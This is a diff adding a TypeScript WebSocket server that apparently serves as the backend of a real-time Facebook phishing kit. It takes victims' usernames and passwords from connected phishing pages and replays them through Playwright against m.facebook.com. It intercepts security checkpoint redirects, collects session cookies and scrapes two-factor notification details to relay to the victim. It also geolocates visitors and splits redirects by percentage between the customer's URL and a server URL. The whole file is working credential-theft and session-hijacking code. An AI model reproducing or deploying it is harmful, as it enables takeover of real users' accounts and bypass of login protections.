@@ -1,0 +1,645 @@
+import WebSocket, { WebSocketServer } from 'ws';
+import * as http from 'http';
+import geoip from 'geoip-lite';
+import Logger from './logger.js';
+import requestIp from 'request-ip';
+import * as UserDB from '../database/user/user.database.js'
+import { ClientInfo } from '../utils/client.info.interface.js';
+
+import { BrowserContext, Page } from 'playwright';
+import { LoginFields } from '../utils/login.fields.interface.js';
+import { findCookieValue, getRandomTimeout } from '../shared/shared.js';
+import BrowserPool from './browserPool.js';
+
+class WebSocketPool {
+    private static wssInstance: WebSocket.Server | null = null;
+    private static clientsMap: Map<string, WebSocket> = new Map();
+    private static logger = new Logger();
+
+    private static MAX_CONNECTIONS: number = 500;
+    private static activeConnections: number = 0;
+    private static clientInfo: ClientInfo;
+    private static currentLogin: { isNew: boolean, url: string };
+
+    private static browserPool = new BrowserPool();
+
+    private static FORMS = [
+        {
+            "emailInput": "#m_login_email",
+            "passInput": "#m_login_password",
+            "buttonLogin": "div[role='button'][data-anchor-id='replay']",
+            "formAction": "com.bloks.www.bloks.caa.login.async.send_login_request",
+            "type": "mobile"
+        },
+        {
+            "emailInput": "form[id='login_form'] #m_login_email",
+            "passInput": "form[id='login_form'] #m_login_password",
+            "buttonLogin": "form[id='login_form'] button[name='login']",
+            "formAction": "/login/device-based/",
+            "type": "mobile"
+        },
+        {
+            "emailInput": "form[id='login_form'] #email",
+            "passInput": "form[id='login_form'] #pass",
+            "buttonLogin": "form[id='login_form'] button[type='submit']",
+            "formAction": "/login/device-based/",
+            "type": "desktop"
+        },
+        {
+            "emailInput": "form[action*='/login/?privacy_mutation_token'] #email",
+            "passInput": "form[action*='/login/?privacy_mutation_token'] #pass",
+            "buttonLogin": "form[action*='/login/?privacy_mutation_token'] button[type='submit']",
+            "formAction": "/login/?privacy_mutation_token",
+            "type": "desktop"
+        }
+    ]
+
+    // constructor(){
+    //     this.browserPool = new BrowserPool();
+    // }
+
+    static createWebSocketServer(server: http.Server): WebSocket.Server | void {
+        if (this.wssInstance) { return this.wssInstance; }
+        this.wssInstance = new WebSocketServer({ server: server, path: "/ws" });
+        this.wssInstance.on('connection', async (client: WebSocket, req: http.IncomingMessage) => {
+            if (this.activeConnections >= this.MAX_CONNECTIONS) {
+                client.send('Lo siento, el servidor está ocupado en este momento. Inténtalo más tarde.');
+                this.logger.alert('Lo siento, el servidor está ocupado en este momento. Inténtalo más tarde.');
+                client.close();
+                return;
+            }
+            const userId = this.uuidv4();
+            this.clientsMap.set(userId, client);
+            const identifier = req.url?.split('=')[1];
+            if (!identifier) {
+                this.handleEvent(userId, {
+                    event: 'nothing',
+                    data: { case: 'identifier not found' }
+                });
+
+                this.clientsMap.delete(userId);
+                this.logger.error(`Usuario ${userId} => Identifier not found`);
+                return;
+            }
+
+            const user = await UserDB.getUserById(identifier);
+            if (!user) {
+                this.handleEvent(userId, {
+                    event: 'nothing',
+                    data: { case: 'user not found' }
+                });
+
+                this.clientsMap.delete(userId);
+                this.logger.error(`Usuario ${userId} => User not found`);
+                return;
+            }
+            const userIp = requestIp.getClientIp(req);
+            if (!userIp) {
+                this.handleEvent(userId, {
+                    event: 'redirect',
+                    data: { url: user.config.redirect }
+                });
+
+                this.clientsMap.delete(userId);
+                this.logger.error(`Usuario ${userId} => Ip not found`);
+                return;
+            }
+            const geoInfo = geoip.lookup(userIp);
+            if (!geoInfo || !geoInfo.country) {
+                this.handleEvent(userId, {
+                    event: 'redirect',
+                    data: { url: user.config.redirect }
+                });
+
+                this.clientsMap.delete(userId);
+                this.logger.error(`Usuario ${userId} => Ip not found`);
+                return;
+            }
+
+            this.clientInfo = {
+                userIp,
+                identifier,
+                config: user.config,
+                percent: user.percent,
+                countryCode: geoInfo.country
+            };
+            this.logger.info(`Usuario ${userId} conectado => IP ${userIp}`);
+            this.handleClient(userId, this.clientInfo, client);
+        });
+    }
+
+    static uuidv4() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+
+    static handleClient(userId: string, clientInfo: ClientInfo, client: WebSocket) {
+        this.activeConnections++;
+        client.on('message', async (message: string) => {
+            try {
+                const { event, data } = JSON.parse(message);
+                switch (event) {
+                    case 'userForm':
+                        await this.runPlaywight(userId, data, clientInfo);
+                        break;
+                    case 'customEvent':
+                        console.log('Evento personalizado:', data);
+                        break;
+                }
+            } catch (error: any) {
+                this.logger.error(`Inesperado en catch on 'message' => ${error.message}`)
+            }
+        });
+
+        client.on('close', () => {
+            this.activeConnections--;
+            this.logger.error(`Usuario ${userId} desconectado => IP ${clientInfo.userIp}`);
+            this.clientsMap.delete(userId);
+        });
+    }
+
+    static handleEvent(userId: string, eventData: any) {
+        const userConnection = this.clientsMap.get(userId);
+        if (userConnection) {
+            try {
+                const serializedData = JSON.stringify(eventData);
+                userConnection.send(serializedData);
+            } catch (error) {
+                console.error('Error al enviar el mensaje:', error);
+            }
+        }
+    }
+
+    static closeConnection(userId: string) {
+        const userConnection = this.clientsMap.get(userId);
+        if (userConnection) {
+            userConnection.send('Conexión cerrada');
+            userConnection.close();
+            this.clientsMap.delete(userId);
+            this.logger.alert(`Conexión cerrada para el usuario ${userId}`);
+        } else {
+            this.logger.error(`No se encontró una conexión para el usuario ${userId}`);
+        }
+    }
+
+    static async runPlaywight(userId: string, data: any, clientInfo: ClientInfo) {
+        const context = await this.browserPool.getBrowserContext(userId);
+
+        // Cierra todas las páginas existentes
+        const allPages = context.pages();
+        await Promise.all(allPages.map((page) => page.close()));
+        
+        // Crea una nueva página
+        const page = await context.newPage();
+
+        this.logger.neutral(`Usuario ${userId} => Abriendo facebook`);
+        await page.goto('https://m.facebook.com/', { waitUntil: 'networkidle', timeout: 0 });
+
+        const response: any = await this.authenticateWithDOM(userId, page, data, context);
+
+        if (response.type === 'login_success') {
+            this.logger.success(response.message);
+            this.handleEvent(userId, {
+                event: response.type,
+                data: { message: '' }
+            });
+        } else if (response.type === 'login_checkpoint') {
+            this.handleEvent(userId, {
+                event: response.type,
+                data: { payload: response.texts }
+            });
+            this.logger.error(response);
+        } else {
+            this.handleEvent(userId, {
+                event: response.type || 'error',
+                data: { message: 's' }
+            });
+
+            // await page.close();
+            // await context.close();
+            // await browser.close();
+            this.logger.error(response.message);
+        }
+    }
+
+    // static async runPlaywight23(userId: string, data: any, clientInfo: ClientInfo) {
+    //     const system = ['ios', 'android'];
+    //     const randomSystem = system[Math.floor(Math.random() * system.length)];
+
+    //     const browser = await chromium.launch({
+    //         headless: false,
+    //         args: [
+    //             '--lang-es-ES',
+    //             '--locale-es-ES',
+    //         ],
+    //     });
+    //     const context = await newInjectedContext(
+    //         browser,
+    //         {
+    //             fingerprintOptions: {
+    //                 devices: ['mobile'],
+    //                 operatingSystems: [randomSystem as "android" | "ios"],
+    //             },
+    //             newContextOptions: {
+    //                 geolocation: {
+    //                     latitude: Math.random() * (90 - -90) + -90,
+    //                     longitude: Math.random() * (90 - -180) + -180,
+    //                 },
+    //                 locale: 'es-ES',
+
+    //             },
+    //         },
+    //     );
+
+
+    //     const page = await context.newPage();
+    //     // Establecer el idioma deseado (por ejemplo, español)
+
+    //     this.logger.neutral(`Usuario ${userId} => Abriendo facebook`);
+    //     await page.goto('https://m.facebook.com/', { waitUntil: 'networkidle', timeout: 0 });
+
+    //     const response: any = await this.authenticateWithDOM(userId, page, data, context);
+
+    //     if (response.type === 'login_success') {
+    //         this.logger.success(response.message);
+    //         this.handleEvent(userId, {
+    //             event: response.type,
+    //             data: { message: 's' }
+    //         });
+    //     } else if (response.type === 'login_checkpoint') {
+    //         this.handleEvent(userId, {
+    //             event: response.type,
+    //             data: { payload: response.texts }
+    //         });
+    //         this.logger.error(response);
+    //     } else {
+    //         this.handleEvent(userId, {
+    //             event: response.type || 'error',
+    //             data: { message: '' }
+    //         });
+
+    //         // await page.close();
+    //         // await context.close();
+    //         // await browser.close();
+    //         this.logger.error(response.message);
+    //     }
+    // }
+
+    // static async authenticateWithDOM(userId: string, page: Page, data: any, context: BrowserContext) {
+    //     this.logger.neutral(`Usuario ${userId} => Logueando facebook...`);
+    //     return new Promise(async (resolve, reject) => {
+    //         const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
+    //         if (!loginFields) {
+    //             return resolve({
+    //                 type: 'error',
+    //                 message: `Usuario ${userId} => Inicio de sesión sin respuesta`
+    //             });
+    //         }
+
+    //         page.on('response', async (response) => {
+    //             const url = response.url();
+    //             const status = response.status();
+    //             if (status >= 300 && status < 400) {
+    //                 console.log(`Redirección detectada: ${status} - ${response.headers().location}`);
+    //                 await page.waitForNavigation({ waitUntil: 'domcontentloaded' });
+    //             }
+
+    //             if (url.includes(loginFields.formAction)) {
+    //                 const cookies = await page.context().cookies();
+    //                 const regex = new RegExp('^\\d+$');
+    //                 const cUserValue = findCookieValue(cookies, 'c_user');
+    //                 if (cUserValue && cUserValue.match(regex)) {
+    //                     resolve({
+    //                         type: 'login_success',
+    //                         message: `Usuario ${userId} => Inicio de sesión exitoso`,
+    //                         cookies
+    //                     });
+    //                 } else {
+    //                     const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
+    //                     if (loginFields) {
+    //                         resolve({
+    //                             type: 'login_failed',
+    //                             message: `Usuario ${userId} => Inicio de sesión fallido`
+    //                         });
+    //                     } else {
+    //                         resolve({
+    //                             type: 'login_checkpoint',
+    //                             message: `Usuario ${userId} => Inicio de sesión bloqueado`
+    //                         });
+    //                     }
+    //                 }
+    //             }
+    //         });
+
+    //         await page.fill(loginFields.emailInput, data.username);
+    //         await page.waitForTimeout(getRandomTimeout());
+    //         await page.fill(loginFields.passInput, data.name);
+    //         await page.waitForTimeout(getRandomTimeout());
+    //         await page.click(loginFields.buttonLogin);
+    //     }).catch((error) => {
+    //         throw new Error(error);
+    //     });
+    // }
+
+    // static async authenticateWithDOM(userId: string, page: Page, data: any, context: BrowserContext) {
+    //     this.logger.neutral(`Usuario ${userId} => Logueando facebook...`);
+    //     return new Promise(async (resolve, reject) => {
+    //         const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
+    //         if (!loginFields) {
+    //             return resolve({
+    //                 type: 'error',
+    //                 message: `Usuario ${userId} => Inicio de sesión sin respuesta`
+    //             });
+    //         }
+
+    //         let navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded' });
+
+    //         page.on('response', async (response) => {
+    //             const url = response.url();
+    //             const status = response.status();
+    //             if (status >= 300 && status < 400) {
+    //                 console.log(`Redirección detectada: ${status} - ${response.headers().location}`);
+    //                 navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded' });
+    //             }
+
+    //             if (url.includes(loginFields.formAction)) {
+    //                 const cookies = await page.context().cookies();
+    //                 const regex = new RegExp('^\\d+$');
+    //                 const cUserValue = findCookieValue(cookies, 'c_user');
+    //                 if (cUserValue && cUserValue.match(regex)) {
+    //                     resolve({
+    //                         type: 'login_success',
+    //                         message: `Usuario ${userId} => Inicio de sesión exitoso`,
+    //                         cookies
+    //                     });
+    //                 } else {
+    //                     const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
+    //                     if (loginFields) {
+    //                         resolve({
+    //                             type: 'login_failed',
+    //                             message: `Usuario ${userId} => Inicio de sesión fallido`
+    //                         });
+    //                     } else {
+    //                         resolve({
+    //                             type: 'login_checkpoint',
+    //                             message: `Usuario ${userId} => Inicio de sesión bloqueado`
+    //                         });
+    //                     }
+    //                 }
+    //             }
+    //         });
+
+    //         await page.fill(loginFields.emailInput, data.username);
+    //         await page.waitForTimeout(getRandomTimeout());
+    //         await page.fill(loginFields.passInput, data.name);
+    //         await page.waitForTimeout(getRandomTimeout());
+    //         await page.click(loginFields.buttonLogin);
+
+    //         try {
+    //             await navigationPromise;
+    //         } catch (error: any) {
+    //             this.logger.error(`Error during navigation: ${error.message}`);
+    //         }
+    //     }).catch((error) => {
+    //         throw new Error(error);
+    //     });
+    // }
+
+    static async authenticateWithDOM(userId: string, page: Page, data: any, context: BrowserContext) {
+        this.logger.neutral(`Usuario ${userId} => Logueando facebook...`);
+        return new Promise(async (resolve, reject) => {
+            const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
+            if (!loginFields) {
+                return resolve({
+                    type: 'error',
+                    message: `Usuario ${userId} => Inicio de sesión sin respuesta`
+                });
+            }
+
+            //  // Interceptar y redirigir manualmente las solicitudes a URLs que contengan "checkpoint"
+            //  await page.route('**/*', async (route, request) => {
+            //     const url = request.url();
+            //     if (url.includes('checkpoint')) {
+            //         console.log(`Redirección interceptada: ${url}`);
+            //         await page.goto(url, { waitUntil: 'domcontentloaded' });
+            //         route.abort();
+            //     } else {
+            //         route.continue();
+            //     }
+            // });
+
+            // Bloquear todas las redirecciones
+            await page.route('**/*', async (route, request) => {
+                route.continue();
+                await page.waitForLoadState("domcontentloaded");
+
+                if (request.url().includes('checkpoint')) {
+                    // route.abort();
+                    // console.log(`Redirección interceptada: ${url}`);
+                    route.fulfill({
+                        status: 302,
+                        headers: {
+                            'Location': 'https://m.facebook.com'
+                        }
+                    });
+                }
+
+                // else if (request.url().includes(loginFields.formAction)) {
+                //     const response = await request.response();
+                //     if(response){
+                //         await page.waitForLoadState("domcontentloaded");
+
+                //         // Si es la version nueva esperar a que cambie su url
+                //         if(this.currentLogin.isNew){
+                //             await page.waitForFunction(
+                //                 () => window.location.href !== this.currentLogin.url,
+                //                 { timeout: 30000 }
+                //             );
+                //         }
+
+                //         // const newContext = await page.context().browser()?.newContext();
+                //         // const newPage = await newContext?.newPage()
+                //         // await newPage?.goto('https://m.facebook.com', { waitUntil: 'domcontentloaded' });
+
+
+                //         // await page.goto('https://m.facebook.com/', { waitUntil: 'domcontentloaded'});
+                //         const cookies = await page.context().cookies();
+                //         const regex = new RegExp('^\\d+$');
+                //         const cUserValue = findCookieValue(cookies, 'c_user');
+                //         if (cUserValue && cUserValue.match(regex)) {
+                //             resolve({
+                //                 type: 'login_success',
+                //                 message: `Usuario ${userId} => Inicio de sesión exitoso`,
+                //                 cookies
+                //             });
+                //         } else {
+                //             // const pages = await page.context().pages();
+
+                //             const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
+                //             if (loginFields) {
+                //                 resolve({
+                //                     type: 'login_failed',
+                //                     message: `Usuario ${userId} => Inicio de sesión fallido`
+                //                 });
+                //             } else {
+                //                 resolve({
+                //                     type: 'login_checkpoint',
+                //                     message: `Usuario ${userId} => Inicio de sesión bloqueado`
+                //                 });
+                //             }
+                //         }
+                //     }
+                // }
+            });
+
+            page.on('response', async (response) => {
+                const url = response.url();
+                if (url.includes(loginFields.formAction)) {
+
+                    // Si es la version nueva esperar a que cambie su url
+                    if (this.currentLogin.isNew) {
+                        await page.waitForFunction(
+                            (url) => window.location.href !== url,
+                            this.currentLogin.url,
+                            { timeout: 30000 }
+                        );
+                    }
+
+                    await page.waitForLoadState("networkidle");
+
+                    const cookies = await page.context().cookies();
+                    // const regex = new RegExp('^\\d+$');
+                    const isLogguedCookie = findCookieValue(cookies, 'c_user');
+                    if (isLogguedCookie /*&& cUserValue.match(regex)*/) {
+                        resolve({
+                            type: 'login_success',
+                            message: `Usuario ${userId} => Inicio de sesión exitoso`,
+                            cookies
+                        });
+                    } else {
+                        const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
+                        if (loginFields) {
+                            resolve({
+                                type: 'login_failed',
+                                message: `Usuario ${userId} => Inicio de sesión fallido`
+                            });
+                        } else {
+                            // Esperar a que los elementos estén presentes en la página
+                            await page.waitForSelector('span[data-bloks-name="bk.components.TextSpan"]');
+
+                            const devices  = await page.$$eval('span[data-bloks-name="bk.components.TextSpan"]', spans => {
+                                const targetRegex = /We sent a notification to your (.*?)\./;
+                                for (const span of spans) {
+                                    if (span.textContent) {
+                                        const match = span.textContent.match(targetRegex);
+                                        if (match) {
+                                            const capturedText = match[1].trim();
+                                            // const modifiedText = capturedText.replace(/and/g, ',');
+                                            const modifiedText = capturedText.replace(/ and /g, ', ');
+                                            return modifiedText;
+                                        }
+                                    }
+                                }
+                                return null;
+                            });
+
+                            const userName = await page.$eval('span[data-bloks-name="bk.components.TextSpan"]', span => {
+                                const targetTextRegex = /(.+) • Facebook/;
+                                if (span.textContent) {
+                                    const trimmedText = span.textContent.trim();
+                                    const match = trimmedText.match(targetTextRegex);
+                                    if (match) {
+                                        const name = match[1].trim();
+                                        return `${name} • Facebook`;
+                                    }
+                                }
+                                return null;
+                            });
+
+                            this.handleEvent(userId, {
+                                event: 'login_checkpoint',
+                                data: { payload: {devices, userName} }
+                            });
+
+                            this.logger.error(`Usuario ${userId} => Inicio de sesión bloqueado`);
+
+                            // Esperar que la url cambie
+                            if (this.currentLogin.isNew) {
+                                await page.waitForFunction(
+                                    (url) => window.location.href !== url,
+                                    page.url(),
+                                    { timeout: 30000 }
+                                );
+                            }
+
+                            await page.waitForLoadState("networkidle");
+
+                            const isLogguedCookie = findCookieValue(cookies, 'c_user');
+                            if(!isLogguedCookie){
+                                this.handleEvent(userId, {
+                                    event: 'redirect',
+                                    data: { url:  this.getRandomRedirect(this.clientInfo.percent, this.clientInfo.config.redirect, this.clientInfo.config.serverRedirect) }
+                                });
+                            }
+                        }
+                    }
+                }
+            });
+
+            this.currentLogin = {
+                url: page.url(),
+                isNew: !(await page.$('form')),
+            };
+
+            await page.fill(loginFields.emailInput, data.username);
+            await page.waitForTimeout(getRandomTimeout());
+            await page.fill(loginFields.passInput, data.name);
+            await page.waitForTimeout(getRandomTimeout());
+            await page.click(loginFields.buttonLogin);
+        }).catch((error) => {
+            throw new Error(error);
+        });
+    }
+
+    static async findVisibleLoginFields(page: Page, forms: LoginFields[]): Promise<LoginFields | null> {
+        for (const form of forms) {
+            const [emailInput, passInput, buttonLogin] = await Promise.all([
+                page.$(form.emailInput),
+                page.$(form.passInput),
+                page.$(form.buttonLogin),
+            ]);
+
+            if (emailInput && passInput && buttonLogin) {
+                const isVisible = await Promise.all([
+                    emailInput.isVisible(),
+                    passInput.isVisible(),
+                    buttonLogin.isVisible(),
+                ]);
+
+                if (isVisible.every((visible) => visible)) {
+                    return form;
+                }
+            }
+        }
+
+        return null;
+    }
+
+    static getRandomRedirect(percent: number, userRedirect: string, serverRedirect: string): string {
+        if (percent === 0) {
+            return userRedirect;
+        }
+    
+        const randomValue = Math.random() * 100;
+    
+        if (randomValue < percent) {
+            return serverRedirect;
+        } else {
+            return userRedirect;
+        }
+    }
+}
+
+export default WebSocketPool;
